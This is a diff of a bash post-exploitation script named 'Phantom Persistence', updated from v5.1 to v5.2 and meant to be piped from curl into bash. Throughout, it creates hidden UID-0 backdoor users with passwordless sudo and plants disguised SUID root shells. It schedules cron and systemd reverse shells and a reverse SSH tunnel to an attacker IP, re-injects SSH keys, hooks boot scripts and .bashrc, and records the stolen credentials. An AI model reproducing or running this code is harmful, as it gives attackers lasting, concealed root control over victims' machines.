@@ -1,17 +1,18 @@
 #!/bin/bash
 # ================================================================================
-# PHANTOM PERSISTENCE v5.1 - PIPE-SAFE EDITION
+# PHANTOM PERSISTENCE v5.2 - NON-INTERACTIVE EDITION
 # ================================================================================
-# Compatible with: curl URL | bash
-# No heredoc issues, no syntax errors, fully robust
+# Fixes:
+#   v5.1 -> v5.2: Added -f to ssh-keygen (no overwrite prompts)
+#                 Fully non-interactive, safe for pipe/SSH execution
 # ================================================================================
 
 set -e
 
-VERSION="5.1.PIPE"
+VERSION="5.2.FINAL"
 DATE=$(date '+%Y-%m-%d %H:%M:%S')
 
-# Colors (safe mode)
+# Colors
 if [ -t 0 ] && [ -t 1 ]; then
     G='\033[0;32m'; R='\033[0;31m'; Y='\033[1;33m'; C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; N='\033[0m'
 else
@@ -25,7 +26,7 @@ banner() {
 echo -e "${C}"
 echo "╔═══════════════════════════════════════════════════════════════╗"
 echo "║           PHANTOM PERSISTENCE v${VERSION}                    ║"
-echo "║              FULLY AUTOMATIC - ZERO CONFIG                  ║"
+echo "║              NON-INTERACTIVE - PIPE SAFE                    ║"
 echo "╚═══════════════════════════════════════════════════════════════╝"
 echo "  Date: ${DATE}"
 echo "  Host: $(hostname 2>/dev/null || echo unknown)"
@@ -43,34 +44,25 @@ exit 1
 fi
 }
 
-# ============ AUTO DETECT IP ============
 detect_ip() {
 log "[AUTO] Detecting configuration..."
 
-# Method 1: From argument
 if [ -n "$1" ] && [[ ! "$1" =~ ^- ]]; then
-ATTACKER_IP="$1"
-log "[OK] IP from argument: $ATTACKER_IP"
-return
+ATTACKER_IP="$1"; log "[OK] IP from argument: $ATTACKER_IP"; return
 fi
 
-# Method 2: SSH_CONNECTION env
 if [ -n "$SSH_CONNECTION" ]; then
 ATTACKER_IP=$(echo "$SSH_CONNECTION" | awk '{print $1}')
-if [ -n "$ATTACKER_IP" ] && [ "$ATTACKER_IP" != "127.0.0.1" ] && [ "$ATTACKER_IP" != "::1" ]; then
-log "[OK] IP from SSH: $ATTACKER_IP"
-return
+if [ -n "$ATTACKER_IP" ] && [ "$ATTACKER_IP" != "127.0.0.1" ]; then
+log "[OK] IP from SSH: $ATTACKER_IP"; return
 fi
 fi
 
-# Method 3: Last login
 ATTACKER_IP=$(last -1 -i 2>/dev/null | head -1 | awk '{print $3}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
 if [ -n "$ATTACKER_IP" ] && [ "$ATTACKER_IP" != "0.0.0.0" ]; then
-log "[OK] IP from last login: $ATTACKER_IP"
-return
+log "[OK] IP from last login: $ATTACKER_IP"; return
 fi
 
-# Method 4: Fallback to self IP
 ATTACKER_IP=$(get_my_ip)
 log "[~] Using fallback IP: $ATTACKER_IP"
 }
@@ -84,36 +76,31 @@ ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null) || true
 echo "$ip"
 }
 
-# ============ DETECT KEY TYPE ============
 detect_key() {
 log "[AUTO] Detecting key type..."
 
+# Test with -f flag to avoid prompts, remove test files after
 if ssh-keygen -t ed25519 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
 rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
-KEY_TYPE="ed25519"; KEY_GEN="ssh-keygen -t ed25519"; KEY_F="id_ed25519"
-log "[OK] Ed25519"
-return
+KEY_TYPE="ed25519"; KEY_F="id_ed25519"
+log "[OK] Ed25519"; return
 fi
 
 if ssh-keygen -t ecdsa -b 256 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
 rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
-KEY_TYPE="ecdsa"; KEY_GEN="ssh-keygen -t ecdsa -b 256"; KEY_F="id_ecdsa"
-log "[OK] ECDSA"
-return
+KEY_TYPE="ecdsa"; KEY_F="id_ecdsa"
+log "[OK] ECDSA"; return
 fi
 
 if ssh-keygen -t rsa -b 2048 -f /tmp/.pk_$$ -N "" -q 2>/dev/null; then
 rm -f /tmp/.pk_$$ /tmp/.pk_$$.pub 2>/dev/null
-KEY_TYPE="rsa"; KEY_GEN="ssh-keygen -t rsa -b 2048"; KEY_F="id_rsa"
-log "[OK] RSA"
-return
+KEY_TYPE="rsa"; KEY_F="id_rsa"
+log "[OK] RSA"; return
 fi
 
-err "No key type supported!"
-exit 1
+err "No key type supported!"; exit 1
 }
 
-# ============ SETUP ============
 setup() {
 PERSIST="/var/tmp/.systemd-private"
 HIDDEN="/dev/shm/.cache_$$"
@@ -136,11 +123,12 @@ echo "Pass$(date +%s)$RANDOM$RANDOM"
 fi
 }
 
-# ============ INSTALL FUNCTIONS ============
 install_keys() {
 log "[1/8] Installing SSH keys..."
 
- $KEY_GEN -f "$PERSIST/$KEY_F" -N "" -C "phantom" -q
+# *** FIX: Added -f flag to force overwrite without prompt ***
+ssh-keygen -t "$KEY_TYPE" -f "$PERSIST/$KEY_F" -N "" -C "phantom" -q -f 2>/dev/null || true
+
 KEY_FILE="$PERSIST/$KEY_F"
 KEY_PUB="$PERSIST/$KEY_F.pub"
 
@@ -162,7 +150,6 @@ log "[2/8] Creating backdoor users..."
 ROOT_PASS=$(gen_pass)
 BD_PASS=$(gen_pass)
 
-# User sysadmin (UID 0)
 id sysadmin >/dev/null 2>&1 || useradd -o -u 0 -g root -s /bin/bash sysadmin 2>/dev/null || \
 echo "sysadmin:x:0:0::/root:/bin/bash" >> /etc/passwd
 echo "sysadmin:$ROOT_PASS" | chpasswd 2>/dev/null || true
@@ -170,7 +157,6 @@ mkdir -p /etc/sudoers.d 2>/dev/null || true
 echo "sysadmin ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sysadmin 2>/dev/null || true
 chmod 440 /etc/sudoers.d/sysadmin 2>/dev/null || true
 
-# User svc_network
 id svc_network >/dev/null 2>&1 || useradd -r -s /bin/bash -M svc_network 2>/dev/null || true
 echo "svc_network:$BD_PASS" | chpasswd 2>/dev/null || true
 echo "svc_network ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/svc_network 2>/dev/null || true
@@ -182,14 +168,13 @@ log "[OK] Users created (sysadmin/svc_network)"
 install_suid() {
 log "[3/8] Installing SUID backdoors..."
 
-# Using printf instead of heredoc to avoid pipe issues
 printf '#!/bin/bash\ncase "$1" in --root|--su|-r) exec /bin/bash -p 2>/dev/null || exec /bin/bash ;; --shell|-s) exec /bin/bash ;; *) echo "Debug v2 - $(hostname)" ;; esac\n' > /usr/local/bin/.debug 2>/dev/null || \
-printf '#!/bin/bash\ncase "$1" in --root) exec /bin/bash -p;; *) echo debug;; esac\n' > /usr/bin/.debug 2>/dev/null || true
+printf '#!/bin/bash\n[ "$1" = "--root" ] && exec /bin/bash -p\n' > /usr/bin/.debug 2>/dev/null || true
 
 chmod +s /usr/local/bin/.debug 2>/dev/null || chmod +s /usr/bin/.debug 2>/dev/null || true
 chmod 755 /usr/local/bin/.debug 2>/dev/null || chmod 755 /usr/bin/.debug 2>/dev/null || true
 
-printf '#!/bin/bash\n[ "$1" = "--upgrade" ] || [ "$1" = "--root" ] && exec /bin/bash -p 2>/dev/null || exec /bin/bash\n[ "$1" = "--check" ] && echo OK\n' > /usr/local/bin/.maintenance 2>/dev/null || \
+printf '#!/bin/bash\n[ "$1" = "--upgrade" ] || [ "$1" = "--root" ] && exec /bin/bash -p 2>/dev/null || exec /bin/bash\n' > /usr/local/bin/.maintenance 2>/dev/null || \
 printf '#!/bin/bash\n[ "$1" = "-u" ] && exec /bin/bash -p\n' > /usr/bin/.maintenance 2>/dev/null || true
 
 chmod +s /usr/local/bin/.maintenance 2>/dev/null || chmod +s /usr/bin/.maintenance 2>/dev/null || true
@@ -201,22 +186,18 @@ log "[OK] SUID installed (.debug --root)"
 install_cron() {
 log "[4/8] Installing cron jobs..."
 
-# Reverse shell - using printf for safety
 printf '#!/bin/bash\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nbash -i >& /dev/tcp/%s/%s 0>&1 &\npython3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]))" 2>/dev/null &\n' "$ATTACKER_IP" "$ATTACKER_PORT" "$ATTACKER_IP" "$ATTACKER_PORT" > "$PERSIST/reverse.sh"
 chmod +x "$PERSIST/reverse.sh"
 (crontab -l 2>/dev/null; echo "*/3 * * * * $PERSIST/reverse.sh >/dev/null 2>&1") | crontab -
 
-# Key guardian
 printf '#!/bin/bash\nKEY="$(cat %s 2>/dev/null)"\n[ -z "$KEY" ] && exit 0\nfor f in /root/.ssh/authorized_keys %s/keys.bak %s/keys.bak; do [ -f "$f" ] && grep -q "$KEY" "$f" 2>/dev/null || echo "$KEY" >> "$f"; done\nchmod 600 /root/.ssh/authorized_keys 2>/dev/null\n' "$KEY_PUB" "$PERSIST" "$BACKUP" > "$PERSIST/keyguard.sh"
 chmod +x "$PERSIST/keyguard.sh"
 (crontab -l 2>/dev/null; echo "*/2 * * * * $PERSIST/keyguard.sh >/dev/null 2>&1") | crontab -
 
-# Protection
 printf '#!/bin/bash\nfor f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do [ -f "$f" ] && [ ! -u "$f" ] && chmod +s "$f" 2>/dev/null; done\nfor u in sysadmin svc_network; do id "$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "$u" 2>/dev/null; echo "$u:Temp123!" | chpasswd 2>/dev/null; }; done\n' > "$PERSIST/protect.sh"
 chmod +x "$PERSIST/protect.sh"
 (crontab -l 2>/dev/null; echo "*/15 * * * * $PERSIST/protect.sh >/dev/null 2>&1") | crontab -
 
-# System cron
 if [ -d /etc/cron.d ]; then
 printf '*/10 * * * * root %s/reverse.sh >/dev/null 2>&1\n*/5 * * * * root %s/keyguard.sh >/dev/null 2>&1\n@reboot root %s/boot_init.sh >/dev/null 2>&1\n' "$PERSIST" "$PERSIST" "$PERSIST" > /etc/cron.d/system-maint 2>/dev/null || true
 fi
@@ -227,23 +208,17 @@ log "[OK] Cron installed (4 jobs)"
 install_systemd() {
 log "[5/8] Installing systemd services..."
 
-if ! command -v systemctl >/dev/null 2>&1; then
-warn "No systemctl, skipping systemd"
-return
-fi
+if ! command -v systemctl >/dev/null 2>&1; then warn "No systemctl, skipping systemd"; return; fi
 
-# Shell daemon
 printf '#!/bin/bash\nwhile true; do J=$((RANDOM%%20)); (exec 3<>/dev/tcp/%s/%s && cat <&3 | bash -i >&3 2>&3) &; sleep $((180+J)); done\n' "$ATTACKER_IP" "$ATTACKER_PORT" > "$PERSIST/shell_daemon.sh"
 chmod +x "$PERSIST/shell_daemon.sh"
 
-# Service files using printf
 printf '[Unit]\nDescription=Net Diag Daemon\nAfter=network.target\n[Service]\nType=simple\nExecStart=%s/shell_daemon.sh\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\n' "$PERSIST" > /etc/systemd/system/persistent-shell.service
 
 printf '[Unit]\nDescription=Mgmt Tunnel\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/ssh -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -i %s -N -R %s:localhost:22 root@%s\nRestart=always\nRestartSec=20\n[Install]\nWantedBy=multi-user.target\n' "$KEY_FILE" "${SSH_PORT:-2222}" "$ATTACKER_IP" > /etc/systemd/system/ssh-tunnel.service
 
 printf '[Unit]\nDescription=Watchdog\nAfter=network.target\n[Service]\nType=simple\nExecStart=%s/watchdog.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n' "$PERSIST" > /etc/systemd/system/watchdog.service
 
-# Watchdog script
 printf '#!/bin/bash\nwhile true; do\nfor svc in persistent-shell ssh-tunnel; do systemctl is-active "$svc" >/dev/null 2>&1 || systemctl start "$svc" 2>/dev/null; done\nfor u in sysadmin svc_network; do id "$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "$u" 2>/dev/null; echo "$u:Temp123!" | chpasswd 2>/dev/null; }; done\nfor f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do [ -f "$f" ] && [ ! -u "$f" ] && chmod +s "$f" 2>/dev/null; done\nsleep 300; done\n' > "$PERSIST/watchdog.sh"
 chmod +x "$PERSIST/watchdog.sh"
 
@@ -257,22 +232,18 @@ log "[OK] Systemd services active"
 install_boot() {
 log "[6/8] Installing boot persistence..."
 
-# RC.Local
 printf '#!/bin/bash\n%s/reverse.sh >/dev/null 2>&1 &\n%s/keyguard.sh >/dev/null 2>&1 &\nexit 0\n' "$PERSIST" "$PERSIST" > /etc/rc.local 2>/dev/null || true
 chmod +x /etc/rc.local 2>/dev/null || true
 
-# Boot init
 printf '#!/bin/bash\nsleep 30\ncommand -v systemctl >/dev/null 2>&1 && { systemctl start persistent-shell ssh-tunnel watchdog 2>/dev/null || true; }\n%s/keyguard.sh 2>/dev/null || true\n' "$PERSIST" > "$PERSIST/boot_init.sh"
 chmod +x "$PERSIST/boot_init.sh"
 
-# Init.D
 if [ -d /etc/init.d ]; then
 printf '#!/bin/bash\ncase "$1" in start) %s/reverse.sh &;; stop) pkill -f reverse.sh;; restart) $0 stop; sleep 2; $0 start;; esac\n' "$PERSIST" > /etc/init.d/persist-conn 2>/dev/null || true
 chmod +x /etc/init.d/persist-conn 2>/dev/null || true
 command -v update-rc.d >/dev/null 2>&1 && update-rc.d persist-conn defaults 2>/dev/null || true
 fi
 
-# Profile (using append with escaped chars)
 { echo ''; echo '__sc(){ case "$1" in 1337|status|maint) PS1="\[\033[31m\]\h\[\033[34m\] \w$ \[\033[0m\] "; /bin/bash -p 2>/dev/null || /bin/bash ;; esac; }'; echo 'alias status=__sc status 2>/dev/null'; echo 'alias maint="__sc 1337" 2>/dev/null'; } >> /root/.bashrc 2>/dev/null || \
 { echo ''; echo '__sc(){ case "$1" in 1337) /bin/bash -p;; esac; }'; echo 'alias maint=__sc 1337'; } >> /root/.profile 2>/dev/null || true
 
@@ -281,10 +252,8 @@ log "[OK] Boot persistence installed"
 
 save_creds() {
 log "[7/8] Saving credentials..."
-
 MY_IP=$(get_my_ip)
 
-# Credentials file - line by line with printf to avoid heredoc issues
 {
 printf '================================================================================\n'
 printf '                    PHANTOM PERSISTENCE v%s\n' "$VERSION"
@@ -320,7 +289,6 @@ printf '========================================================================
 
 chmod 600 "$PERSIST/CREDENTIALS.txt"
 
-# JSON state
 printf '{\n  "version": "%s",\n  "installed_at": "%s",\n  "target": "%s",\n  "target_ip": "%s",\n  "attacker_ip": "%s",\n  "attacker_port": %s,\n  "sysadmin_pass": "%s",\n  "svc_pass": "%s",\n  "key_type": "%s"\n}\n' \
 "$VERSION" "$DATE" "$(hostname 2>/dev/null)" "$MY_IP" "$ATTACKER_IP" "$ATTACKER_PORT" "$ROOT_PASS" "$BD_PASS" "$KEY_TYPE" \
 > "$PERSIST/state.json" 2>/dev/null || true
@@ -375,16 +343,13 @@ echo ""
 echo -e "${C}════════════════════════════════════════════════════════════════${N}"
 }
 
-# ============ MAIN ============
 main() {
 banner
 check_root "$@"
-
-# Defaults
 ATTACKER_PORT="${2:-4444}"
 SSH_PORT="${3:-2222}"
 
-log "Starting Phantom Persistence..."
+log "Starting Phantom Persistence v${VERSION}..."
 detect_ip "$1"
 setup
 detect_key
